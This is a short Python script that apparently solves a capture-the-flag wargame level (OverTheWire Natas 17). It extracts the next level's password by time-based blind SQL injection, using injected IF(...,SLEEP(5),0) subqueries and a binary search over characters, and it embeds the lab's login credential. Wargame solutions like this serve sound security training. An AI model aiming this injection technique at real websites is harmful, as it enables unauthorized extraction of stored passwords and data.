import time, urllib.request, urllib.parse, base64
# natas17: totally blind SQLi (no echo). Timing oracle: IF(cond, SLEEP(5), 0)
# sleeps 5s per matched row (~4 rows -> ~20 s) when true, ~0.4 s when false.
# The users table holds several rows with DIFFERENT passwords, so the condition
# MUST use a scalar subquery pinned to username="natas18" - a bare
# SUBSTR(password,pos,1) mixes every row's password and converges to garbage.
url = "http://natas17.natas.labs.overthewire.org/"
auth = "Basic " + base64.b64encode(b"natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx").decode()
def true_cond(p):
    d = urllib.parse.urlencode({"username": p}).encode()
    r = urllib.request.Request(url, data=d, headers={"Authorization": auth})
    t0 = time.time()
    urllib.request.urlopen(r, timeout=90).read()
    return time.time() - t0 > 10
out = ""
for pos in range(1, 33):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if true_cond(f'x" OR IF((SELECT ORD(SUBSTR(password,{pos},1)) FROM users WHERE username="natas18")>{mid},SLEEP(5),0)-- -'):
            lo = mid + 1
        else:
            hi = mid
    out += chr(lo)
    print(out, flush=True)
print("FINAL", out)

